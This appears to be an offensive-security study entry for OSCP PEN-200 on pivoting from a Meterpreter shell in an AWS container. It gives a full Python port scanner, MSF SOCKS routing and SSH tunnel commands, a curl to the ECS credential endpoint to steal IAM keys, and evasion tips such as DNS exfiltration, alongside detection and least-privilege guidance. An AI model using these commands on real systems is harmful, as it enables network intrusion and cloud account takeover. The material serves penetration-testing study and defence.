name: AWS - Container Network Pivot via Meterpreter & SOCKS Proxy
command:
# In Meterpreter session:
meterpreter > ifconfig
meterpreter > upload /home/kali/netscan.py /netscan.py
meterpreter > shell
python /netscan.py <cidr>

# In MSF console:
use auxiliary/server/socks_proxy
route add <ip> 255.255.0.0 <session_id>

# SSH tunnel to forward SOCKS:
ssh -fN -L localhost:1080:localhost:1080 kali@<cloud_kali_ip>
description: After getting a Meterpreter shell inside a container, pivot into the container's internal network to reach services not exposed externally. Steps: (1) enumerate network interfaces to identify internal subnets, (2) upload a Python port scanner to map live hosts and open ports on the container network, (3) set up MSF SOCKS proxy with route to pivot traffic through the Meterpreter session, (4) if the Meterpreter session is on a cloud Kali instance, SSH-forward the SOCKS proxy back to local Kali for browser/tool access. auxiliary/server/socks_proxy is exam-ok (auxiliary module, not exploit).
source: OSCP PEN-200 Chapter 25: Attacking AWS Cloud Infrastructure (25.10.2 - 25.10.3)

examples.label: Enumerate network interfaces in Meterpreter
examples.command:
meterpreter > ifconfig
# eth0: 172.18.0.4/16 (Docker bridge)
# eth1: 172.30.0.5/16 (shared network with other containers)
# Multiple interfaces reveal additional container networks

examples.label: Shell out and check environment for more network info
examples.command:
meterpreter > shell
printenv | grep -i network
cat /etc/hosts
ip route

examples.label: Write Python network scanner to local Kali
examples.command:
# /home/kali/netscan.py - scans a CIDR for common ports:
import socket, sys
from concurrent.futures import ThreadPoolExecutor

def scan(host, ports=[22,80,443,8080,8443,3306,5432]):
    open_ports = []
    for port in ports:
        try:
            s = socket.socket()
            s.settimeout(0.5)
            s.connect((host, port))
            open_ports.append(port)
            s.close()
        except: pass
    if open_ports:
        print(f'{host}: {open_ports}')

cidr = sys.argv[1]  # e.g., 172.30.0.0/24
base = '.'.join(cidr.split('.')[:3])
with ThreadPoolExecutor(max_workers=50) as ex:
    ex.map(scan, [f'{base}.{i}' for i in range(1,255)])

examples.label: Upload Python scanner to compromised container
examples.command:
meterpreter > upload /home/kali/netscan.py /netscan.py
# [*] Uploading  : /home/kali/netscan.py -> /netscan.py
# [*] Uploaded 1.00 KiB of 1.00 KiB

examples.label: Run network scan from inside the container
examples.command:
meterpreter > shell
python /netscan.py 172.30.0.0/24
# 172.30.0.10: [8080]   <- Jenkins on internal network
# 172.30.0.50: [3306]   <- MySQL
# 172.30.0.1:  [22]     <- Gateway / host

examples.label: Set up SOCKS proxy through the Meterpreter session (exam-ok)
examples.command:
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j

examples.label: Add route through Meterpreter session to pivot subnet
examples.command:
msf6 > route add 172.30.0.0 255.255.0.0 1
# [*] Route added
# Now MSF modules and proxychains traffic routes through session 1

examples.label: Configure proxychains to use the SOCKS proxy
examples.command:
# /etc/proxychains4.conf - add at end:
# socks5 127.0.0.1 1080
proxychains curl http://172.30.0.10:8080/login
# Or for browser: set SOCKS5 proxy to 127.0.0.1:1080

examples.label: SSH tunnel to forward SOCKS from cloud Kali to local machine
examples.command:
# If MSF is running on a cloud Kali VM and you need SOCKS locally:
ssh -fN -L localhost:1080:localhost:1080 kali@<cloud_kali_ip>
# Now localhost:1080 on your local machine tunnels to cloud Kali's SOCKS proxy
# Configure proxychains or browser to 127.0.0.1:1080 locally

notes: auxiliary/server/socks_proxy is exam-ok (it is an auxiliary server module, not an exploit). 'route add' in the MSF console routes MSF's own traffic through the session — it does NOT affect system-level proxychains traffic unless combined with socks_proxy. For proxychains: 'proxychains4 -q <command>' suppresses verbose proxy output. MSF's 'route' command is different from Linux 'ip route' — it only affects MSF module traffic. For full OS-level tunneling without MSF, use SSH dynamic forwarding: 'ssh -D 1080 -N user@pivot_host'. The Python netscan.py approach is useful because many containers only have Python (no nmap, masscan). Adjust the ports list and timeout based on network speed — 0.5s timeout works well for same-subnet Docker networks.

references.title: OffSec PEN-200 - Attacking AWS Cloud Infrastructure

recommended.note: Meterpreter session typically obtained via supply chain attack on internal service.
After pivoting to internal network, discover and exfiltrate Terraform state files.
post/multi/manage/autoroute automates route adding; same exam rules apply.

defense.why_it_works: Once inside an AWS container (ECS task, EKS pod, or Lambda), the container's IAM role credentials are available via the instance metadata service. ECS: credentials at 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI. EKS: via IRSA (IAM Roles for Service Accounts) token file. Lambda: via AWS_ACCESS_KEY_ID env var. These credentials can be exfiltrated and used from outside the container, enabling pivot from the container to the broader AWS environment via the container's IAM permissions.
defense.prerequisites: Code execution within an AWS container (via RCE vulnerability, command injection, or supply chain). Access to instance metadata or container credentials endpoint. AWS CLI or HTTP client to call AWS APIs with the container's credentials.
defense.impact: T1090.003 Proxy: Multi-hop Proxy + T1021 Remote Services + T1570 Lateral Tool Transfer. Pivots from container compromise to AWS IAM access — the container's role permissions become the attacker's permissions. If the task role is admin-level, full account compromise from a single container RCE.
defense.detection:
CloudTrail: API calls made with the ECS task role credentials from an unexpected IP (not the ECS task's VPC IP range). The credentials exfiltration itself (GET request to 169.254.170.2) is not logged in CloudTrail — only the subsequent AWS API calls using those credentials from an external IP are detectable. GuardDuty: 'PrivilegeEscalation:IAMUser/AdministrativePermissions' or 'Credential Access:IAMUser/AnomalousBehavior'.
Detect network traffic flows using well-known protocols that are not normal for the environment. Monitor for processes spawning unexpected network connections. Analyze packet contents for protocol abnormalities. Look for connections to external infrastructure for servers or systems that do not normally have such connections. Domain fronting may be detected by analyzing TLS certificate information and host header values (DET0178).
defense.artifacts: CloudTrail: API calls from container role ARN but from external IP (ECS task credentials used externally) | GuardDuty: container credential theft finding | VPC Flow Logs: outbound connection from container to external IP (credential exfiltration) | CloudWatch: container task making unexpected outbound connections
defense.prevention:
ECS credential endpoint access control: restrict 169.254.170.2 to the container process only (network policy where possible). Least-privilege task roles: container role should only have permissions for its specific function — not admin. Enable GuardDuty for container threat detection. ECS network mode: use awsvpc mode with security groups limiting outbound. Lambda: use VPC with limited egress. Monitor credential usage source IPs in CloudTrail.
Filter Network Traffic: Use network appliances to filter ingress/egress traffic on common and uncommon ports used for proxying.
Network Intrusion Prevention: Use IDS/IPS to identify patterns associated with proxy traffic.
SSL/TLS Inspection: Implement SSL inspection to detect encrypted C2 traffic tunneled through proxies.
defense.evasion: Use stolen credentials from within the same VPC/region to match the expected source IP. Make API calls consistent with the container's normal behavior. Exfiltrate credentials via DNS (covert channel) rather than direct HTTP (may bypass egress rules).
defense.misconfiguration: ECS task role over-permissioned (admin or broad permissions). No monitoring of where container IAM credentials are used (CloudTrail source IP). No outbound egress restriction from containers (allows credential exfiltration). GuardDuty not enabled for container threat detection.
defense.vulnerable_config:
# ECS task metadata credential access (from container):
curl http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}
# → {'AccessKeyId': 'ASIA...', 'SecretAccessKey': '...', 'Token': '...'}

# Exfiltrate and use from attacker machine:
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws iam list-users  # Uses container role = potentially admin
defense.secure_config:
# ECS task role: least privilege example
# Task that reads S3 and writes to SQS:
# {
#   'Effect': 'Allow',
#   'Action': ['s3:GetObject'],
#   'Resource': 'arn:aws:s3:::input-bucket/*'
# },
# {
#   'Effect': 'Allow',
#   'Action': ['sqs:SendMessage'],
#   'Resource': 'arn:aws:sqs:::output-queue'
# }
# Nothing else — no iam:*, no ec2:*, no s3:ListBucket globally

# GuardDuty container threat detection:
aws guardduty update-detector --detector-id DETECTOR_ID \
  --features '[{"Name":"ECS_RUNTIME_MONITORING","Status":"ENABLED"}]'

# CloudTrail alert: container role used from external IP:
# Metric filter: eventSource != internal AND userIdentity.arn CONTAINS task-role
